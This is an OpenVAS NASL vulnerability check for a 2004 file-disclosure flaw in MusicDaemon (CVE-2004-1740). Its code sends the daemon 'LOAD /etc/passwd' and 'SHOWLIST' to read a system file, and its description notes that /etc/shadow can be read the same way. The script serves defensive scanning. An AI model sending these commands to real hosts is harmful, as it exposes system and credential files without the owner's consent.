# OpenVAS Vulnerability Test
# $Id: musicd_file_disclosure.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Music Daemon File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running MusicDaemon, a music player running as a server.

It is possible to cause the Music Daemon to disclose the
content of arbitrary files by inserting them to the list 
of tracks to listen to.

An attacker can list the content of arbitrary files including the 
/etc/shadow file, as by default the daemon runs under root privileges.";

tag_solution = "None at this time";

# From: "cyber talon" <cyber_talon@hotmail.com>
# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
# Date: 23.8.2004 17:36

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.14354");  
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-1740");
 script_bugtraq_id(11006);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 name = "Music Daemon File Disclosure";
 script_name(name);
 
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 
 family = "Remote file access";
 script_family(family);
 
 script_dependencies("find_service2.nasl");
 script_require_ports("Services/musicdaemon", 5555);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include('global_settings.inc');

port = get_kb_item("Services/musicdaemon");
if ( ! port ) port = 5555;
if ( port == 0 ) exit(0);

if ( ! get_port_state(port) ) exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

recv = recv_line(socket:soc, length: 1024);

if ("Hello" >< recv)
{
 data = string("LOAD /etc/passwd\r\n");
 send(socket:soc, data: data);

 data = string("SHOWLIST\r\n");
 send(socket:soc, data: data);

 recv = recv(socket:soc, length: 1024);
 close(soc);
 if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:recv) ) security_message(port:port);
}
